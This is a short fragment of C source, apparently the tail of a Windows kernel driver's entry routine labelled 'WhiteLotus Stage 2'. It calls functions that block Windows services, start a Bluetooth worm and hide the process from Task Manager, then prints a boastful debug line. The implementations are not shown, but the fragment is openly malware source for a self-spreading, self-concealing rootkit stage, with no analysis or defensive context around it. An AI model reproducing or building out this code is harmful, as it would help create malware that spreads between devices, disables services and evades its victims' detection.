    BlockWindowsServices();
    
    StartBluetoothWorm();
    
    HideProcessFromTaskManager(PsGetCurrentProcessId());
    
    DbgPrint("WhiteLotus Stage 2: Loaded\r\n");
    DbgPrint("Ghost is not who invisible, ghost is me.\r\n");
    
    return STATUS_SUCCESS;
}